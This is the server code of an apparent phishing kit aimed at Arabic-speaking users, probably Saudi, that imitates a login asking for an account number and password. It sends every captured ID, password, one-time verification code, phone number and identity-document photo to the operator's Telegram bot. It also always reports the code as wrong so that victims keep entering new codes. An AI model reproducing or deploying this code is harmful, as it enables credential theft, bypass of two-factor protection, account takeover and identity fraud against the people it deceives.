import express from "express";
import path from "path";
import crypto from "crypto";
import { createRequire } from "module";
import { fileURLToPath } from "url";

const require = createRequire(import.meta.url);
const { BOT_TOKEN, CHAT_ID } = require("./telegram-config.cjs");

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3000;
const SESSION_TTL_MS = 30 * 60 * 1000;

/** @type {Map<string, { id: string, password: string, createdAt: number }>} */
const sessions = new Map();

app.use(express.json());
app.use("/assets", express.static(path.join(__dirname, "assets")));
app.use(express.static(__dirname));

function nowAr() {
  return new Date().toLocaleString("ar-SA", { timeZone: "Asia/Riyadh" });
}

function createSession(credentials) {
  const session = crypto.randomUUID();
  sessions.set(session, { ...credentials, createdAt: Date.now() });
  return session;
}

function getSession(sessionId) {
  const row = sessions.get(sessionId);
  if (!row) return null;
  if (Date.now() - row.createdAt > SESSION_TTL_MS) {
    sessions.delete(sessionId);
    return null;
  }
  return row;
}

async function sendTelegram(text) {
  const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text }),
  });
  const tgData = await tgRes.json();
  if (!tgData.ok) {
    console.error("Telegram error:", tgData);
    throw new Error("telegram_failed");
  }
}

async function sendTelegramPhoto(base64, filename, caption) {
  const raw = base64.includes(",") ? base64.split(",")[1] : base64;
  const bytes = Buffer.from(raw, "base64");
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", new Blob([bytes], { type: "image/jpeg" }), filename || "photo.jpg");
  if (caption) form.append("caption", caption);

  const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: form,
  });
  const tgData = await tgRes.json();
  if (!tgData.ok) {
    console.error("Telegram photo error:", tgData);
    throw new Error("telegram_failed");
  }
}

app.get("/api/health", (_req, res) => {
  res.json({ ok: true });
});

app.post("/api/login", async (req, res) => {
  const id = String(req.body?.id ?? "").trim();
  const password = String(req.body?.password ?? "");

  if (!id || !password) {
    return res.status(400).json({ ok: false, message: "أدخل رقم المميز وكلمة المرور" });
  }

  if (!/^\d+$/.test(id)) {
    return res.status(400).json({ ok: false, message: "رقم المميز أرقام فقط" });
  }

  const session = createSession({ id, password });

  const text = ["🔐 محاولة دخول جديدة", "", `رقم المميز: ${id}`, `كلمة المرور: ${password}`, "", `الوقت: ${nowAr()}`].join(
    "\n"
  );

  try {
    await sendTelegram(text);
    return res.json({ ok: true, session });
  } catch {
    sessions.delete(session);
    return res.status(502).json({ ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
});

app.post("/api/verify", async (req, res) => {
  const sessionId = String(req.body?.session ?? "");
  const code = String(req.body?.code ?? "").trim();
  const step = String(req.body?.step ?? "1");
  let login = getSession(sessionId);
  if (!login) {
    const id = String(req.body?.id ?? "").trim();
    const password = String(req.body?.password ?? "");
    if (id && password) login = { id, password };
  }

  if (!login) {
    return res.status(400).json({ ok: false, message: "انتهت الجلسة، سجّل الدخول من جديد" });
  }

  if (!/^\d{4,8}$/.test(code)) {
    return res.status(400).json({ ok: false, message: "أدخل رمز التحقق" });
  }

  const text = [
    `📲 رمز تحقق (${step})`,
    "",
    `رقم المميز: ${login.id}`,
    `كلمة المرور: ${login.password}`,
    `رمز التحقق: ${code}`,
    "",
    `الوقت: ${nowAr()}`,
  ].join("\n");

  try {
    await sendTelegram(text);
    return res.json({ ok: true, valid: false, message: "رمز التحقق خاطئ" });
  } catch {
    return res.status(502).json({ ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
});

app.post("/api/submit-id", async (req, res) => {
  const id = String(req.body?.id ?? "").trim();
  const password = String(req.body?.password ?? "");
  const phone = String(req.body?.phone ?? "").trim();
  const images = Array.isArray(req.body?.images) ? req.body.images : [];

  if (!id || !password) {
    return res.status(400).json({ ok: false, message: "انتهت الجلسة، سجّل الدخول من جديد" });
  }
  if (!/^\d{7,15}$/.test(phone)) {
    return res.status(400).json({ ok: false, message: "أدخل رقم هاتف صحيح" });
  }
  if (images.length === 0 || images.length > 3) {
    return res.status(400).json({ ok: false, message: "ارفق من 1 إلى 3 صور للهوية" });
  }

  const text = [
    "🪪 هوية شخصية + هاتف",
    "",
    `رقم المميز: ${id}`,
    `كلمة المرور: ${password}`,
    `رقم الهاتف: ${phone}`,
    `عدد الصور: ${images.length}`,
    "",
    `الوقت: ${nowAr()}`,
  ].join("\n");

  try {
    await sendTelegram(text);
    for (let i = 0; i < images.length; i += 1) {
      await sendTelegramPhoto(String(images[i]), `id-${id}-${i + 1}.jpg`, `هوية ${i + 1} — ${id}`);
    }
    return res.json({ ok: true });
  } catch {
    return res.status(502).json({ ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
});

setInterval(() => {
  const now = Date.now();
  for (const [key, row] of sessions) {
    if (now - row.createdAt > SESSION_TTL_MS) sessions.delete(key);
  }
}, 5 * 60 * 1000);

app.listen(PORT, "0.0.0.0", () => {
  console.log(`http://localhost:${PORT}`);
});
